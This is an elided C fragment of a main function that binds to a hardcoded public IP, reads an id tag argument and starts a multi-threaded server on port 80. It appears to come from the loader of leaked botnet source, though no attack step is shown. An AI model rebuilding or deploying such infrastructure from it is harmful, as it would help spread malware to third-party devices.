...
int main(int argc, char **args)
{
    ...
    addrs[0] = inet_addr("138.68.17.225"); // Address to bind to
    addrs[1] = inet_addr("138.68.17.225"); // Address to bind to
    if (argc == 2)
    {
        id_tag = args[1];
    }
    ...
    if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "138.68.17.225", 80, "138.68.17.225")) == NULL)
    {
